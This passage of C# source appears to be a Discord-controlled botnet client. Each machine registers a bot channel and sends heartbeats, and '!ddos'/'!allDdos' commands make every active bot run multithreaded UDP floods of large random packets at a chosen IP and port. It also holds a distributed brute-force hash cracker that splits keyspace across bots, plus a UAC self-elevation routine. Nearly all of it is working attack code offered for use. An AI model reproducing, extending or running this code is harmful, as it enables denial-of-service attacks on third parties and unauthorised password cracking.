                        await message.Channel.SendMessageAsync($"Invalid arguments. Please use !ddos <ip> <port> <time>");
                    }
                }
                else if (trimmedContent.StartsWith("!allDdos"))
                {
                    // Get the aruments (!ddos <ip> <port> <time>)
                    string argument = trimmedContent.Substring(9);
                    string[] arguments = argument.Split(" ");

                    // Check if the arguments are valid
                    if (arguments.Length == 3)
                    {
                        // Get the arguments
                        string ip = arguments[0];
                        string port = arguments[1];
                        string time = arguments[2];

                        // Find all other bots (including itself)
                        computers = FindOthers();
                        // Log the active computers
                        foreach (var computer in computers)
                        {
                            // Send discord message (!crack)
                            guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                            channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computer}");
                            await channel.SendMessageAsync($"!ddos {ip} {port} {time}");
                            Log(new LogMessage(LogSeverity.Info, "DDoS", $"Started DDoS with bot-{computer}..."));
                        }

                        // Send discord message
                        await message.Channel.SendMessageAsync($"Starting DDoS attack on {ip}:{port} with all active bots for {time} seconds...");
                    }
                    else
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Invalid arguments. Please use !ddos <ip> <port> <time>");
                    }
                }
                else if (trimmedContent == "!stopddos")
                {
                    // Send discord message
                    await message.Channel.SendMessageAsync($"Stopping all DDoS attacks...");

                    // Stop DDoS attack
                    await Task.Run(() => StopDDoS());
                }

                // Invalid Command
                else if (trimmedContent.StartsWith("!"))
                {
                    await message.Channel.SendMessageAsync("Invalid command. Please use !help for a list of commands.");
                    Log(new LogMessage(LogSeverity.Info, "Message", $"Invalid command: {trimmedContent}"));
                }
            }
            else
            {
                Log(new LogMessage(LogSeverity.Info, "Message", "Received empty or whitespace-only message."));
            }
        }
        private async Task CreateBotLogsChannel()
        {
            try
            {
                var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild

                if (guild != null)
                {
                    // Find the name of computer
                    string computerNameRaw = Environment.MachineName;
                    string computerName = computerNameRaw.ToLower();

                    // Check if the channel already exists
                    var existingChannel = guild.TextChannels.FirstOrDefault(channel => channel.Name == $"bot-{computerName}");

                    if (existingChannel == null)
                    {
                        // Create the channel if it doesn't exist
                        var channel = await guild.CreateTextChannelAsync($"bot-{computerName}");
                        Log(new LogMessage(LogSeverity.Info, "Discord", $"Created bot-{computerName} channel."));
                        // You can add additional configuration for the channel if needed
                        // For example: await channel.ModifyAsync(properties => properties.Topic = "Bot logs channel");

                        // Start heartbeat timer in a new thread
                        await TimerThread();
                    }
                    else
                    {
                        Log(new LogMessage(LogSeverity.Info, "Discord", $"bot-{computerName} channel already exists. Using it."));
                        Log(new LogMessage(LogSeverity.Info, "Discord", $"Deleting all messages in bot-{computerName} channel..."));

                        // Find all messages in the channel and make them into a list
                        var messages = existingChannel.GetMessagesAsync(100).FlattenAsync().Result;
                        List<IMessage> messageList = messages.ToList();

                        // Delete all messages in the channel (with list)
                        await existingChannel.DeleteMessagesAsync(messageList);
                        Log(new LogMessage(LogSeverity.Info, "Discord", $"Deleted all messages in bot-{computerName} channel."));


                        // Start heartbeat timer in a new thread
                        await TimerThread();
                    }
                }
                else
                {
                    // Handle the case where the bot is not a member of any guild
                    Console.WriteLine("Bot is not a member of any guild.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Exception during bot startup: {ex}");
            }
        }


        // Spliting
        static List<Tuple<int, int>> SplitRange(int start, int end, int splits)
        {
            if (splits <= 0)
            {
                throw new ArgumentException("Number of splits must be greater than 0.");
            }

            List<Tuple<int, int>> splitRanges = new List<Tuple<int, int>>();
            int rangeSize = (end - start + 1) / splits;
            int remainder = (end - start + 1) % splits;

            int currentStart = start;
            int currentEnd = start + rangeSize - 1 + Math.Min(remainder, 1);

            for (int i = 0; i < splits; i++)
            {
                splitRanges.Add(new Tuple<int, int>(currentStart, currentEnd));

                currentStart = currentEnd + 1;
                currentEnd = currentStart + rangeSize - 1 + (i + 1 < remainder ? 1 : 0);
            }

            return splitRanges;
        }


        // Admin
        static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            // Check if the current user is in the Administrators group
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        void ElevateToAdmin()
        {
            // Get the path of the current executable
            string exePath = Application.ExecutablePath;

            // Create a new processStartInfo
            ProcessStartInfo processStartInfo = new ProcessStartInfo(exePath);
            processStartInfo.Verb = "runas";

            try
            {
                // Start the process
                Process.Start(processStartInfo);
            }
            catch (Exception ex)
            {
                // Handle exceptions (e.g., user cancels UAC prompt)
                MessageBox.Show($"Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                // Exit the current process
                Environment.Exit(0);
            }
        }



        // Timer
        private async Task TimerThread()
        {
            Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Heartbeat started."));

            // First heartbeat
            SendHeartbeat();

            // Use System.Timers.Timer instead of System.Windows.Forms.Timer
            System.Timers.Timer heartbeatTimer = new System.Timers.Timer();
            heartbeatTimer.Interval = 30000; // Set the interval (e.g., 30 seconds)
            // Set the callback for the timer
            heartbeatTimer.Elapsed += (sender, e) =>
            {
                // Access 'this' in a way that doesn't impact your logic
                var unused = this.ToString();
                SendHeartbeat();
                CheckOnOthers();
            };
            heartbeatTimer.Start();
        }
        async void SendHeartbeat()
        {
            Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Sending heartbeat..."));
            try
            {
                // Send a heartbeat message to the discord created log-channel
                var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                string computerNameRaw = Environment.MachineName;
                string computerName = computerNameRaw.ToLower();
                var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");

                if (channel != null)
                {
                    // Send message
                    await channel.SendMessageAsync("Heartbeat");
                    Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Heartbeat sent."));
                }
                else
                {
                    Log(new LogMessage(LogSeverity.Error, "Heartbeat", $"Error sending heartbeat. Channel not found. ({computerName})"));
                }
            }
            catch (Exception ex)
            {
                // Handle exceptions (e.g., log or display an error message)
                Log(new LogMessage(LogSeverity.Error, "Heartbeat", $"Error sending heartbeat: {ex.Message}"));
            }
        }



        // Find other bots
        private List<string> FindOthers()
        {
            // New list of possible bots
            List<string> possibleBots = new List<string>();

            try
            {
                // Look for text channels in server that start with "bot-"
                var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                var channels = guild.TextChannels;

                foreach (var channel in channels)
                {
                    if (channel.Name.StartsWith("bot-"))
                    {
                        // Get the name of the computer
                        string computerNameRaw = channel.Name;
                        string computerName = computerNameRaw.Substring(4);

                        // Check if the computer name is the same as this computer
                        if (computerName != Environment.MachineName)
                        {
                            // Check if the channel has sent a heartbeat in the last 30 seconds
                            var lastMessage = channel.GetMessagesAsync(1).FlattenAsync().Result.FirstOrDefault();
                            if (lastMessage != null)
                            {
                                var timeDifference = DateTime.Now - lastMessage.Timestamp.DateTime;
                                if (timeDifference.TotalSeconds > 30)
                                {
                                    // The channel has sent a heartbeat in the last 30 seconds
                                    // Add it to the list of other bots (possibleBots)
                                    possibleBots.Add(computerName);
                                }
                                else
                                {
                                    // The channel has not sent a heartbeat in the last 30 seconds
                                    Log(new LogMessage(LogSeverity.Error, "Discord", $"No heartbeat found in {channel.Name}. Will now remove the channel and possible bot"));
                                    // Delete channel
                                    channel.DeleteAsync();
                                }
                            }
                            else
                            {
                                // No messages found in the channel
                                Log(new LogMessage(LogSeverity.Error, "Discord", $"No messages found in {channel.Name}. Will now remove the channel and possible bot"));
                                // Delete channel
                                channel.DeleteAsync();
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // Catch any error
                Log(new LogMessage(LogSeverity.Error, "Discord", $"Error finding other bots. {ex.Message}"));
            }

            // Return the list of active computers with a heartbeat
            return possibleBots;
        }
        private async void CheckOnOthers()
        {
            // Basicly just check if the other bots have found the password
            // If they have, then stop cracking
            // If they haven't, then continue cracking
            // If there are no other bots, then continue cracking
            // If there are other bots, but they haven't sent a heartbeat in the last 30 seconds, then continue cracking

            // Find other bots
            computers = FindOthers();
            // Log the active computers
            foreach (var computer in computers)
            {
                Log(new LogMessage(LogSeverity.Info, "Discord", $"Found active computer: {computer}"));
                // Access their own channel
                var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computer}");
                // Get the last message
                var lastMessage = (await channel.GetMessagesAsync(1).FlattenAsync()).FirstOrDefault();

                // Get the latest 3 messages
                var messages = await channel.GetMessagesAsync(3).FlattenAsync();

                // Check time difference between now and then
                var timeDifference = (DateTime.UtcNow - lastMessage.Timestamp.UtcDateTime).TotalSeconds;
                Log(new LogMessage(LogSeverity.Info, "Discord", $"Time difference: {timeDifference} seconds"));
                Log(new LogMessage(LogSeverity.Info, "Discord", $"Timestamp: {lastMessage.Timestamp}"));
                Log(new LogMessage(LogSeverity.Info, "Discord", $"UtcNow: {DateTime.UtcNow}"));

                // "password found! <hash>:<pass>"
                if (lastMessage.Content.StartsWith("Password found!"))
                {
                    // The other bot has found the password
                    // Stop cracking
                    FoundCorrectPass = true;
                    SomeoneElseFoundPassword = true;
                    elsesPassword = lastMessage.Content.Substring(17);
                    elsesHash = lastMessage.Content.Substring(0, 64);
                    Log(new LogMessage(LogSeverity.Info, "Discord", $"Other bot found password: {lastMessage.Content}"));
                    Log(new LogMessage(LogSeverity.Info, "Discord", $"DEBUG: {elsesHash}:{elsesPassword}"));
                    // Send discord message
                    var guild2 = _client.Guilds.FirstOrDefault(); // Get the first available guild
                    string computerNameRaw = Environment.MachineName;
                    string computerName = computerNameRaw.ToLower();
                    var channel2 = guild2.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
                    await channel2.SendMessageAsync($"Other bot found password: {lastMessage.Content}");
                    // Stop cracking
                    btnStopCracking_Click(null, null);
                }
                else if (timeDifference > 90)
                {
                    // The channel has not sent a heartbeat in the last 30 seconds
                    Log(new LogMessage(LogSeverity.Error, "Discord", $"No heartbeat found in {channel.Name}. Will now remove the channel and possible bot"));
                    // Delete channel
                    // Check if channel is the same as this computer
                    string computerNameRaw = Environment.MachineName;
                    string computerName = computerNameRaw.ToLower();
                    if (channel.Name == $"bot-{computerName}")
                    {
                        // The channel is the same as this computer
                        // Do not delete the channel
                        Log(new LogMessage(LogSeverity.Error, "Discord", $"Channel is the same as this computer. Will not delete the channel."));
                    }
                    else
                    {
                        // The channel is not the same as this computer
                        // Delete the channel
                        await channel.DeleteAsync();
                    }
                }
                else
                {
                    foreach (var message in messages)
                    {
                        if (message.Content.StartsWith("Password found!"))
                        {
                            // The other bot has found the password
                            // Stop cracking
                            FoundCorrectPass = true;
                            SomeoneElseFoundPassword = true;
                            elsesPassword = lastMessage.Content.Substring(17);
                            elsesHash = lastMessage.Content.Substring(0, 64);
                            Log(new LogMessage(LogSeverity.Info, "Discord", $"Other bot found password: {lastMessage.Content}"));
                            Log(new LogMessage(LogSeverity.Info, "Discord", $"DEBUG: {elsesHash}:{elsesPassword}"));
                            // Send discord message
                            var guild2 = _client.Guilds.FirstOrDefault(); // Get the first available guild
                            string computerNameRaw = Environment.MachineName;
                            string computerName = computerNameRaw.ToLower();
                            var channel2 = guild2.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
                            await channel2.SendMessageAsync($"Other bot found password: {lastMessage.Content}");
                            // Stop cracking
                            btnStopCracking_Click(null, null);
                        }
                    }
                }
            }
        }



        // get status
        private string GetStatus()
        {
            // Calculate hashes per second
            double hashesPerSecond = counter / stopwatch.Elapsed.TotalSeconds;
            int hashesPerSecondInt = Convert.ToInt32(hashesPerSecond);
            // Calculate estimated time remaining
            double estimatedTimeRemaining = (CalculateCombinations(UseNumbers, UseLetters, UseSymbols, UseCapitals, MaxLength, MinLength) - counter) / hashesPerSecond;
            // Calculate time elapsed
            TimeSpan timeElapsed = stopwatch.Elapsed;

            string status = "";
            status += $"Password found: {FoundCorrectPass} \r\n";
            status += $"Hash: {hash} \r\n";
            status += $"Attempts: {counter} \r\n";
            status += $"Possible Combinations: {CalculateCombinations(UseNumbers, UseLetters, UseSymbols, UseCapitals, MaxLength, MinLength)} \r\n";
            status += $"Guesses: {counter}/{CalculateCombinations(UseNumbers, UseLetters, UseSymbols, UseCapitals, MaxLength, MinLength)} \r\n";
            status += $"Hashes per second: {hashesPerSecondInt} \r\n";
            status += $"Time elapsed: {timeElapsed.ToString(@"hh\:mm\:ss\:fff")} (hh\"mm\"ss\"fff)\r\n";
            status += $"Estimated time remaining: {TimeSpan.FromSeconds(estimatedTimeRemaining).ToString(@"hh\:mm\:ss\:fff")} (hh\"mm\"ss\"fff)\r\n";
            status += $"Force start: {forceStart} \r\n";
            status += $"Force end: {forceEnd} \r\n";

            return status;
        }
        private string GetInfo()
        {
            string info = "";
            info += $"Hash: {hash} \r\n";
            info += $"Algorithm: {Algorithm} \r\n";
            info += $"UseNumbers: {UseNumbers} \r\n";
            info += $"UseLetters: {UseLetters} \r\n";
            info += $"UseSymbols: {UseSymbols} \r\n";
            info += $"UseCapitals: {UseCapitals} \r\n";
            info += $"Max length: {MaxLength} \r\n";
            info += $"Min length: {MinLength} \r\n";
            return info;
        }




        // Form
        public void PassToHash(string pass)
        {
            string hash = "";

            byte[] data = Encoding.ASCII.GetBytes(pass);
            if (Algorithm == "SHA256")
            {
                data = new SHA256Managed().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }
            else if (Algorithm == "SHA512")
            {
                data = new SHA512Managed().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }
            else if (Algorithm == "MD5")
            {
                data = new MD5CryptoServiceProvider().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }
            else if (Algorithm == "SHA1")
            {
                data = new SHA1Managed().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }
            else if (Algorithm == "SHA384")
            {
                data = new SHA384Managed().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }
            else if (Algorithm == "HMACSHA256")
            {
                data = new HMACSHA256().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }
            else if (Algorithm == "HMACSHA512")
            {
                data = new HMACSHA512().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }
            else if (Algorithm == "HMACMD5")
            {
                data = new HMACMD5().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }

            // Debug
            txtOutput.AppendText("Attempt #" + counter + ": " + pass + "\r\n");
            //txtOutput.AppendText("Hashed password: " + hash + "\r\n");

            txtGuessedPassword.Text = hash;
        }

        private async void btnStartCracking_Click(object sender, EventArgs e)
        {
            await Task.Run(() => StartCrackingAsync());
        }

        private async Task StartCrackingAsync()
        {
            Log(new LogMessage(LogSeverity.Info, "Cracking", "Cracking started..."));
            string finalPassword = "";
            FoundCorrectPass = false;
            EmergencySTOP = false;

            stopwatch.Start();

            foreach (var password in GeneratePasswords(MinLength, MaxLength, UseLetters, UseNumbers, UseCapitals, UseSymbols))
            {
                if (EmergencySTOP || counter >= forceEnd)
                {
                    break;
                }
                counter++;
                if (counter < forceStart)
                {
                    continue;
                }

                PassToHash(password);

                // Check if found password is the target password
                if (txtGuessedPassword.Text == txtTargetHash.Text)
                {
                    stopwatch.Stop();
                    FoundCorrectPass = true;
                    finalPassword = password;
                    Log(new LogMessage(LogSeverity.Info, "Cracking", "Password found! (" + txtGuessedPassword.Text + ":" + finalPassword + ")"));
                    // Log how much time it took
                    TimeSpan time = TimeSpan.FromMilliseconds(stopwatch.Elapsed.TotalSeconds);
                    Log(new LogMessage(LogSeverity.Info, "Cracking", "It only took " + time.ToString(@"hh\:mm\:ss\:fff") + " to find the password!"));
                    break;
                }
            }

            stopwatch.Stop();

            // Log
            Log(new LogMessage(LogSeverity.Info, "Cracking", "Cracking stopped."));
            // Send message to discord
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            string computerNameRaw = Environment.MachineName;
            string computerName = computerNameRaw.ToLower();
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
            if (FoundCorrectPass)
            {
                await channel.SendMessageAsync($"Password found! {txtGuessedPassword.Text}:{finalPassword}");
            }
            else
            {
                await channel.SendMessageAsync($"Password NOT found! {txtGuessedPassword.Text}:{finalPassword}");
            }
            // If you want to use the target hash as the final password, you can do this:
            txtDonePassword.Text = finalPassword.ToString();
        }



        // Generate passwords
        public IEnumerable<string> GeneratePasswords(int minLength, int maxLength, bool useLetters, bool useNumbers, bool useCapitals, bool useSymbols)
        {
            var chars = "";
            if (useLetters) chars += "abcdefghijklmnopqrstuvwxyz";
            if (useNumbers) chars += "0123456789";
            if (useCapitals) chars += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            if (useSymbols) chars += "!@#$%^&*()";

            // Calculate the number of combinations
            long combinations = CalculateCombinations(UseNumbers, UseLetters, UseSymbols, UseCapitals, MaxLength, MinLength);
            Log(new LogMessage(LogSeverity.Info, "Password", "Number of combinations: " + combinations));

            for (int length = minLength; length <= maxLength; length++)
            {
                foreach (var password in GenerateCombinations(chars, length))
                {
                    yield return password;
                }
            }
        }

        private IEnumerable<string> GenerateCombinations(IEnumerable<char> chars, int length)
        {
            if (length == 1) return chars.Select(c => c.ToString());

            return GenerateCombinations(chars, length - 1)
                .SelectMany(str => chars, (str, c) => str + c);
        }

        // Calculate combinations
        static long CalculateCombinations(bool useNumbers, bool useLetters, bool useSymbols, bool useCapitals, int maxLength, int minLength)
        {
            // Define the number of characters for each type
            int numNumbers = useNumbers ? 10 : 0; // 0-9
            int numLetters = useLetters ? 26 : 0; // a-z
            int numSymbols = useSymbols ? 32 : 0; // You can adjust this based on the symbols you want to include
            int numCapitals = useCapitals ? 26 : 0; // A-Z

            // Calculate the total number of characters
            int totalCharacters = numNumbers + numLetters + numSymbols + numCapitals;

            // Validate the input parameters
            if (minLength < 1 || maxLength < minLength)
            {
                throw new ArgumentException("Invalid length parameters");
            }

            // Calculate the number of combinations
            long combinations = 0;
            for (int length = minLength; length <= maxLength; length++)
            {
                combinations += (long)Math.Pow(totalCharacters, length);
            }

            return combinations;
        }








        // DDOS
        private void DDoS(string ip, string port, string time)
        {
            // Check if the ip is valid
            if (IsValidIP(ip))
            {
                // Check if the port is valid
                if (IsValidPort(port))
                {
                    // Check if the time is valid
                    if (IsValidTime(time))
                    {
                        // Start the DDoS attack
                        Log(new LogMessage(LogSeverity.Info, "DDoS", $"Starting DDoS attack on {ip}:{port} for {time} seconds..."));
                        // Send discord message
                        var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                        string computerNameRaw = Environment.MachineName;
                        string computerName = computerNameRaw.ToLower();
                        var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
                        channel.SendMessageAsync($"Starting DDoS attack on {ip}:{port} for {time} seconds...");
                        Log(new LogMessage(LogSeverity.Info, "DDoS", $"Starting DDoS attack on {ip}:{port} for {time} seconds..."));
                        // Start the DDoS attack
                        DDoSAttack(ip, port, time);
                    }
                    else
                    {
                        // Send discord message
                        var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                        string computerNameRaw = Environment.MachineName;
                        string computerName = computerNameRaw.ToLower();
                        var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
                        channel.SendMessageAsync($"Invalid time. Please use a number between 1 and 3600.");
                        Log(new LogMessage(LogSeverity.Info, "DDoS", $"Invalid time. Please use a number between 1 and 3600."));
                    }
                }
                else
                {
                    // Send discord message
                    var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                    string computerNameRaw = Environment.MachineName;
                    string computerName = computerNameRaw.ToLower();
                    var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
                    channel.SendMessageAsync($"Invalid port. Please use a number between 1 and 65535.");
                    Log(new LogMessage(LogSeverity.Info, "DDoS", $"Invalid port. Please use a number between 1 and 65535."));
                }
            }
            else
            {
                // Send discord message
                var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                string computerNameRaw = Environment.MachineName;
                string computerName = computerNameRaw.ToLower();
                var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
                channel.SendMessageAsync($"Invalid IP. Please use a valid IPv4 address.");
                Log(new LogMessage(LogSeverity.Info, "DDoS", $"Invalid IP. Please use a valid IPv4 address."));
            }
        }
        private void StopDDoS()
        {
            // Stop all DDoS attacks
            Log(new LogMessage(LogSeverity.Info, "DDoS", $"Stopping all DDoS attacks..."));
            // Send discord message
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            string computerNameRaw = Environment.MachineName;
            string computerName = computerNameRaw.ToLower();
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
            channel.SendMessageAsync($"Stopping all DDoS attacks...");
            Log(new LogMessage(LogSeverity.Info, "DDoS", $"Stopping all DDoS attacks..."));
        }
        private bool IsValidIP(string ipAddress)
        {
            IPAddress parsedIpAddress;

            // Try to parse the IP address
            if (IPAddress.TryParse(ipAddress, out parsedIpAddress))
            {
                // Check if the parsed IP address is IPv4 or IPv6
                return parsedIpAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork ||
                       parsedIpAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6;
            }

            return false;
        }
        private bool IsValidPort(string port)
        {
            // Convert string to int
            int portInt = Convert.ToInt32(port);
            // Check if the port number is within the valid range (1 to 65535)
            return portInt >= 1 && portInt <= 65535;
        }
        private bool IsValidTime(string time)
        {
            // Convert string to int
            int timeInt = Convert.ToInt32(time);
            // Check if the time is within the valid range (1 to 3600)
            return timeInt >= 1 && timeInt <= 3600;
        }
        private void DDoSAttack(string ip, string port, string time)
        {
            // Create abunch of threads that send packets to the target ip and port


            // Convert the ip to an IPAddress
            IPAddress ipAddress = IPAddress.Parse(ip);
            // Convert the port to an int
            int portInt = Convert.ToInt32(port);
            // Convert the time to an int
            int timeInt = Convert.ToInt32(time);

            // Create a list of threads
            List<Thread> threads = new List<Thread>();

            // Create a thread for each core
            for (int i = 0; i < Environment.ProcessorCount; i++)
            {
                // Create a thread
                Thread thread = new Thread(() => SendPackets(ipAddress, portInt, timeInt));
                // Add the thread to the list of threads
                threads.Add(thread);
                // Start the thread
                thread.Start();
                Log(new LogMessage(LogSeverity.Info, "DDoS", $"Thread {thread.ManagedThreadId} started."));
            }

            // Wait for all threads to finish
            foreach (var thread in threads)
            {
                thread.Join();
                Log(new LogMessage(LogSeverity.Info, "DDoS", $"Thread {thread.ManagedThreadId} finished."));
            }

            // Send discord message
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            string computerNameRaw = Environment.MachineName;
            string computerName = computerNameRaw.ToLower();
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
            channel.SendMessageAsync($"DDoS attack on {ip}:{port} for {time} seconds has finished.");
            Log(new LogMessage(LogSeverity.Info, "DDoS", $"DDoS attack on {ip}:{port} for {time} seconds has finished."));
        }

        private void SendPackets(IPAddress ipAddress, int port, int time)
        {
            // Create a socket
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            // Create a random number generator
            Random random = new Random();
            // Create a byte array
            byte[] bytes = new byte[65500];

            // Create a stopwatch
            Stopwatch stopwatch = new Stopwatch();
            // Start the stopwatch
            stopwatch.Start();
            Log(new LogMessage(LogSeverity.Info, "DDoS", $"Thread {Thread.CurrentThread.ManagedThreadId} started."));

            // Send packets until the time is up
            while (stopwatch.Elapsed.TotalSeconds < time)
            {
                // Create a random number of bytes
                random.NextBytes(bytes);
                // Send the bytes to the target ip and port
                socket.SendTo(bytes, new IPEndPoint(ipAddress, port));
                txtOutput.AppendText("Sent packet to " + ipAddress + ":" + port + "\r\n");
            }

            // Stop the stopwatch
            stopwatch.Stop();
            Log(new LogMessage(LogSeverity.Info, "DDoS", $"Thread {Thread.CurrentThread.ManagedThreadId} finished."));
        }



        // Form components

        private void txtTargetHash_TextChanged(object sender, EventArgs e)
        {
            hash = txtTargetHash.Text;
        }

        private void txtDonePassword_TextChanged(object sender, EventArgs e)
        {
            password = txtDonePassword.Text;
        }

        private void btnStopCracking_Click(object sender, EventArgs e)
        {
            EmergencySTOP = true;
            Log(new LogMessage(LogSeverity.Info, "Cracking", "Emergency stop triggered."));
        }

        private void txtMax_TextChanged(object sender, EventArgs e)
        {
            MaxLength = Convert.ToInt32(txtMax.Text);
        }

        private void txtMin_TextChanged(object sender, EventArgs e)
        {
            MinLength = Convert.ToInt32(txtMin.Text);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            // Call the FindOthers function
            List<string> activeComputers = FindOthers();

            // Log the active computers
            foreach (var computer in activeComputers)
            {
                Log(new LogMessage(LogSeverity.Info, "Discord", $"Active computer: {computer}"));
            }
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            SendHeartbeat();
        }

        private void btnElevate_Click(object sender, EventArgs e)
        {
            // Elevate to admin
            ElevateToAdmin();
        }
    }

}